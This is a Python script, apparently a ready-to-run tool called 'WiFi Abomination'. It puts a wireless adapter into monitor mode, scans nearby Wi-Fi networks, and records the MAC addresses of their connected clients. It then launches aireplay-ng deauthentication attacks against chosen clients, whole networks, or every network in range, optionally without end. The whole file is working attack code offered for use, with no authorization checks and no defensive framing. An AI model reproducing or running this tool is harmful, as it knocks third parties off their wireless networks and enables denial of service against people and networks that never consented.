# -*- coding: utf-8 -*-

import os
import subprocess
import csv
import signal
import time
import ctypes
import sys
import glob
import re

print('''

██╗    ██╗██╗███████╗██╗                                                                
██║    ██║██║██╔════╝██║                                                                
██║ █╗ ██║██║█████╗  ██║                                                                
██║███╗██║██║██╔══╝  ██║                                                                
╚███╔███╔╝██║██║     ██║                                                                
╚══╝╚══╝ ╚═╝╚═╝     ╚═╝                                                                
                                                                                        
█████╗ ██████╗  ██████╗ ███╗   ███╗██╗███╗   ██╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██║████╗  ██║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
███████║██████╔╝██║   ██║██╔████╔██║██║██╔██╗ ██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
██╔══██║██╔══██╗██║   ██║██║╚██╔╝██║██║██║╚██╗██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
██║  ██║██████╔╝╚██████╔╝██║ ╚═╝ ██║██║██║ ╚████║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                                                                                        
made by ssskingsss12 

use with caution
''')

# Constants
MENU_OPTIONS = {
    "1": "Enable Monitor Mode",
    "2": "Scan Networks",
    "3": "Monitor Networks for Clients",
    "4": "Deauth Attack",
    "5": "Exit",
}

# Global variables
monitor_adapter = None
scan_data = {'networks': []}

def signal_handler(sig, frame):
    print("\n\n[+] Returning to menu...")
    raise KeyboardInterrupt

def run_command(command):
    """Run command and return output"""
    try:
        process = subprocess.Popen(command, shell=True, 
                                  stdout=subprocess.PIPE, 
                                  stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        return stdout.strip(), stderr.strip()
    except Exception as e:
        return "", str(e)

def get_adapter_mode(interface):
    """Get current mode of a wireless adapter"""
    output, _ = run_command("iw dev {} info".format(interface))
    for line in output.splitlines():
        if "type" in line:
            mode = line.split()[-1]
            return mode
    return "unknown"

def list_network_adapters():
    """List all wireless adapters"""
    adapters = []
    output, _ = run_command("iw dev")
    if output:
        current_interface = None
        for line in output.splitlines():
            if line.strip().startswith("Interface"):
                current_interface = line.split()[1]
            elif "type" in line and current_interface:
                mode = line.split()[-1]
                adapters.append((current_interface, mode))
                current_interface = None
    return adapters

def check_for_monitor_adapter():
    """Auto detect monitor mode adapter"""
    global monitor_adapter
    adapters = list_network_adapters()
    for name, mode in adapters:
        if mode == "monitor":
            monitor_adapter = name
            print("[+] Found adapter in monitor mode: {}".format(monitor_adapter))
            return True
    print("[!] No adapters found in monitor mode.")
    return False

def enable_monitor_mode():
    """Enable monitor mode"""
    global monitor_adapter
    
    adapters = list_network_adapters()
    if not adapters:
        print("[!] No wireless adapters found.")
        return False
    
    print("\n[+] Available wireless adapters:")
    for i, (name, mode) in enumerate(adapters, start=1):
        print("    {}. {} (Mode: {})".format(i, name, mode))
    
    try:
        choice = int(raw_input("\nSelect adapter: ").strip())
        if choice < 1 or choice > len(adapters):
            print("[!] Invalid choice.")
            return False
        
        adapter = adapters[choice - 1][0]
        
        print("[+] Enabling monitor mode on {}...".format(adapter))
        run_command("sudo ip link set {} down".format(adapter))
        run_command("sudo iw dev {} set type monitor".format(adapter))
        run_command("sudo ip link set {} up".format(adapter))
        
        monitor_adapter = adapter
        print("[+] Monitor mode enabled on {}".format(adapter))
        return True
        
    except:
        print("[!] Invalid input.")
        return False

def scan_networks():
    """Initial scan to find networks"""
    global monitor_adapter
    
    if not monitor_adapter:
        print("[!] No adapter in monitor mode!")
        return
    
    print("\n[+] Scanning for networks (30 seconds)...")
    print("[+] Press Ctrl+C to stop\n")
    
    filename = "networks"
    cmd = "sudo airodump-ng {} -w {} --output-format csv".format(monitor_adapter, filename)
    
    process = subprocess.Popen(cmd, shell=True)
    
    for i in range(30, 0, -1):
        sys.stdout.write("\r[+] Time remaining: {} seconds".format(i))
        sys.stdout.flush()
        time.sleep(1)
    
    print("\n")
    process.terminate()
    time.sleep(2)
    
    csv_files = glob.glob("networks-*.csv")
    if not csv_files:
        print("[!] No scan results found!")
        return
    
    networks = []
    with open(csv_files[0], 'r') as f:
        reader = csv.reader(f)
        for row in reader:
            if row and len(row) >= 14:
                first_col = row[0].strip()
                if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', first_col):
                    bssid = first_col
                    channel = row[3].strip()
                    signal = row[8].strip()
                    ssid = row[13].strip()
                    
                    networks.append({
                        'bssid': bssid,
                        'ssid': ssid if ssid else "Hidden",
                        'channel': channel,
                        'signal': signal,
                        'clients': []
                    })
    
    if not networks:
        print("[!] No networks found!")
        return
    
    with open("networks_list.csv", 'w') as f:
        f.write("BSSID,SSID,Channel,Signal\n")
        for net in networks:
            f.write("{},{},{},{}\n".format(
                net['bssid'], net['ssid'], net['channel'], net['signal']))
    
    print("\n[+] Found {} networks".format(len(networks)))
    for i, net in enumerate(networks[:15], 1):
        print("    {}. {} - BSSID: {} Ch:{}".format(i, net['ssid'][:25], net['bssid'], net['channel']))
    
    print("\n[+] Networks saved to networks_list.csv")
    print("[+] Use Option 3 to monitor these networks for clients")
    
    for f in csv_files:
        try:
            os.remove(f)
        except:
            pass

def monitor_networks_for_clients():
    """Monitor each network individually to capture clients"""
    global monitor_adapter, scan_data
    
    if not monitor_adapter:
        print("[!] No adapter in monitor mode!")
        return
    
    # Check if networks_list.csv exists
    if not os.path.exists("networks_list.csv"):
        print("[!] No networks_list.csv found!")
        print("    Please run Option 2 first")
        return
    
    # Read networks from CSV file
    networks = []
    with open("networks_list.csv", 'r') as f:
        reader = csv.reader(f)
        header = next(reader)  # Skip header row
        print("[+] Header: {}".format(header))
        
        for row in reader:
            if len(row) >= 4:
                bssid = row[0].strip()
                ssid = row[1].strip()
                channel = row[2].strip()
                signal = row[3].strip()
                
                print("[+] Found network: {} - {} (Ch: {})".format(ssid, bssid, channel))
                
                networks.append({
                    'bssid': bssid,
                    'ssid': ssid,
                    'channel': channel,
                    'signal': signal,
                    'clients': []
                })
    
    if not networks:
        print("[!] No networks found in networks_list.csv!")
        return
    
    print("\n[+] Found {} networks to monitor".format(len(networks)))
    
    try:
        monitor_time = int(raw_input("[+] Seconds per network (default 10): ").strip())
        if monitor_time < 5:
            monitor_time = 10
    except:
        monitor_time = 10
    
    confirm = raw_input("\nStart monitoring? (y/n): ").strip().lower()
    if confirm != 'y':
        return
    
    # Monitor each network
    for idx, net in enumerate(networks, 1):
        print("\n[{}/{}] Monitoring: {}".format(idx, len(networks), net['ssid']))
        print("    BSSID (MAC): {}".format(net['bssid']))
        print("    Channel: {}".format(net['channel']))
        
        filename = "client_{}".format(net['bssid'].replace(':', ''))
        cmd = "sudo airodump-ng --bssid {} -c {} {} -w {}".format(
            net['bssid'], net['channel'], monitor_adapter, filename)
        
        process = subprocess.Popen(cmd, shell=True)
        
        clients_found = []
        for i in range(monitor_time, 0, -1):
            sys.stdout.write("\r    Time remaining: {} seconds - Clients: {}".format(i, len(clients_found)))
            sys.stdout.flush()
            time.sleep(1)
        
        print("\n")
        process.terminate()
        time.sleep(2)
        
        # Look for client CSV files
        csv_files = glob.glob("{}*.csv".format(filename))
        if csv_files:
            with open(csv_files[0], 'r') as f:
                reader = csv.reader(f)
                in_clients = False
                for row in reader:
                    if row and len(row) > 0:
                        if 'Station MAC' in row[0]:
                            in_clients = True
                            continue
                        if in_clients and row and len(row) >= 1:
                            client_mac = row[0].strip()
                            if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', client_mac):
                                if client_mac not in clients_found:
                                    clients_found.append(client_mac)
            
            net['clients'] = clients_found
            print("    Found {} clients".format(len(clients_found)))
            for client in clients_found[:5]:
                print("        - {}".format(client))
        
        # Cleanup
        for f in csv_files:
            try:
                os.remove(f)
            except:
                pass
        for f in glob.glob("{}*.cap".format(filename)):
            try:
                os.remove(f)
            except:
                pass
    
    # Save to scan_data.csv with BSSID and clients
    with open("scan_data.csv", 'w') as f:
        f.write("BSSID,SSID,Channel,Signal,Clients\n")
        for net in networks:
            clients_str = ";".join(net['clients']) if net['clients'] else "None"
            f.write("{},{},{},{},{}\n".format(
                net['bssid'], net['ssid'], net['channel'], net['signal'], clients_str))
    
    # Auto-load the data
    scan_data['networks'] = networks
    
    networks_with_clients = [n for n in networks if n['clients']]
    total_clients = sum(len(n['clients']) for n in networks)
    
    print("\n" + "="*50)
    print("[+] MONITORING COMPLETE")
    print("="*50)
    print("[+] Networks with clients: {}".format(len(networks_with_clients)))
    print("[+] Total clients found: {}".format(total_clients))
    print("[+] Data saved to scan_data.csv and loaded for attack")
    
    if networks_with_clients:
        print("\n[+] Ready to attack! Use Option 4")
        print("\n[+] Networks with clients:")
        for net in networks_with_clients:
            print("    - {} ({}) - {} clients".format(net['ssid'], net['bssid'], len(net['clients'])))

def deauth_attack():
    """Perform deauthentication attack using BSSID from CSV"""
    global monitor_adapter, scan_data
    
    if not monitor_adapter:
        print("[!] No adapter in monitor mode!")
        print("    Please run Option 1 first")
        return
    
    # Check if we have scan data
    if not scan_data['networks']:
        # Try to load from file
        if os.path.exists("scan_data.csv"):
            print("\n[+] Loading scan_data.csv...")
            networks = []
            with open("scan_data.csv", 'r') as f:
                reader = csv.reader(f)
                next(reader)  # Skip header
                for row in reader:
                    if len(row) >= 5:
                        bssid = row[0].strip()  # This is the MAC address
                        ssid = row[1].strip()   # This is the network name
                        channel = row[2].strip()
                        signal = row[3].strip()
                        clients_str = row[4].strip()
                        clients = clients_str.split(';') if clients_str != 'None' else []
                        networks.append({
                            'bssid': bssid,  # MAC address for -a parameter
                            'ssid': ssid,    # Network name for display
                            'channel': channel,
                            'signal': signal,
                            'clients': clients
                        })
            scan_data['networks'] = networks
            print("[+] Loaded {} networks from scan_data.csv".format(len(networks)))
        else:
            print("\n[!] No scan data found!")
            print("    Please run Option 3 first to monitor networks for clients")
            return
    
    networks_with_clients = [n for n in scan_data['networks'] if n['clients']]
    
    if not networks_with_clients:
        print("\n[!] No networks with clients found!")
        print("    Please run Option 3 to capture clients")
        return
    
    print("\n" + "="*50)
    print("[+] NETWORKS WITH CLIENTS")
    print("="*50)
    
    for i, net in enumerate(networks_with_clients, 1):
        print("\n{}. {}".format(i, net['ssid']))
        print("   BSSID (MAC): {}".format(net['bssid']))  # Show the MAC that will be used
        print("   Channel: {}".format(net['channel']))
        print("   Clients: {}".format(len(net['clients'])))
        for client in net['clients'][:5]:
            print("      - {}".format(client))
        if len(net['clients']) > 5:
            print("      ... and {} more".format(len(net['clients']) - 5))
    
    try:
        choice = raw_input("\nAttack (a=all networks, or number): ").strip()
        if not choice:
            return
        
        print("\n[+] Deauth options:")
        print("    1. Deauth specific clients (targeted)")
        print("    2. Deauth ALL clients on network (broadcast)")
        attack_type = raw_input("Choice (1 or 2): ").strip()
        
        print("\n[+] Number of deauth packets to send:")
        print("    0 = continuous (forever)")
        print("    1-20 = specific number")
        packets = raw_input("Packets (default 5): ").strip()
        packets = int(packets) if packets else 5
        
        if choice.lower() == 'a':
            print("\n[+] Attacking ALL networks...")
            print("[+] Press Ctrl+C to stop\n")
            
            for net in networks_with_clients:
                print("\n" + "="*50)
                print("[+] Network: {}".format(net['ssid']))
                print("[+] BSSID (MAC): {}".format(net['bssid']))  # Show the MAC being used
                
                if attack_type == '2':
                    print("[+] Sending broadcast deauth to ALL clients")
                    # Use the BSSID (MAC) from the CSV for -a parameter
                    cmd = "sudo aireplay-ng --deauth {} -a {} {}".format(
                        packets, net['bssid'], monitor_adapter)
                    print("    Command: {}".format(cmd))
                    run_command(cmd)
                else:
                    for idx, client in enumerate(net['clients'], 1):
                        print("[{}/{}] Deauthing: {}".format(idx, len(net['clients']), client))
                        # Use BSSID for -a and client MAC for -c
                        cmd = "sudo aireplay-ng --deauth {} -a {} -c {} {}".format(
                            packets, net['bssid'], client, monitor_adapter)
                        print("    Command: {}".format(cmd))
                        run_command(cmd)
                        time.sleep(0.3)
                
                print("[+] Completed: {}".format(net['ssid']))
                
        else:
            try:
                idx = int(choice) - 1
                if 0 <= idx < len(networks_with_clients):
                    net = networks_with_clients[idx]
                    
                    print("\n" + "="*50)
                    print("[+] TARGET: {}".format(net['ssid']))
                    print("[+] BSSID (MAC): {}".format(net['bssid']))  # Show the MAC being used
                    print("[+] Channel: {}".format(net['channel']))
                    
                    if attack_type == '2':
                        confirm = raw_input("\nStart broadcast deauth? (y/n): ").strip().lower()
                        if confirm == 'y':
                            # Use BSSID (MAC) from CSV for -a parameter
                            cmd = "sudo aireplay-ng --deauth {} -a {} {}".format(
                                packets, net['bssid'], monitor_adapter)
                            print("\n[+] Sending broadcast deauth...")
                            print("    Command: {}".format(cmd))
                            run_command(cmd)
                            print("[+] Attack completed!")
                    else:
                        print("\n[+] Clients to attack:")
                        for client in net['clients']:
                            print("    - {}".format(client))
                        
                        confirm = raw_input("\nStart targeted deauth? (y/n): ").strip().lower()
                        if confirm == 'y':
                            print("\n[+] Starting attack...")
                            for idx2, client in enumerate(net['clients'], 1):
                                print("[{}/{}] Deauthing: {}".format(idx2, len(net['clients']), client))
                                # Use BSSID for -a and client MAC for -c
                                cmd = "sudo aireplay-ng --deauth {} -a {} -c {} {}".format(
                                    packets, net['bssid'], client, monitor_adapter)
                                print("    Command: {}".format(cmd))
                                run_command(cmd)
                                time.sleep(0.3)
                            print("\n[+] Attack completed!")
                else:
                    print("[!] Invalid selection")
                    
            except ValueError:
                print("[!] Invalid input")
                
    except KeyboardInterrupt:
        print("\n[+] Attack stopped by user")
    except Exception as e:
        print("[!] Error: {}".format(e))

def is_admin():
    return os.geteuid() == 0

def main():
    global monitor_adapter
    
    if not is_admin():
        print("[!] This script must be run as root!")
        return
    
    signal.signal(signal.SIGINT, signal_handler)
    check_for_monitor_adapter()
    
    while True:
        try:
            print("\n" + "="*50)
            print("WiFi Deauthentication Tool")
            print("="*50)
            print("Adapter: {}".format(monitor_adapter if monitor_adapter else "None"))
            if scan_data['networks']:
                clients = sum(len(n.get('clients', [])) for n in scan_data['networks'])
                print("Ready: {} networks, {} clients".format(len(scan_data['networks']), clients))
            print("="*50)
            
            for key, value in MENU_OPTIONS.items():
                print("  {}: {}".format(key, value))
            
            choice = raw_input("\nChoice: ").strip()
            
            if choice == "1":
                enable_monitor_mode()
            elif choice == "2":
                scan_networks()
            elif choice == "3":
                monitor_networks_for_clients()
            elif choice == "4":
                deauth_attack()
            elif choice == "5":
                print("\n[+] Exiting...")
                break
            else:
                print("[!] Invalid choice")
                
        except KeyboardInterrupt:
            print("\n[+] Returning to menu...")
            continue

if __name__ == "__main__":
    main()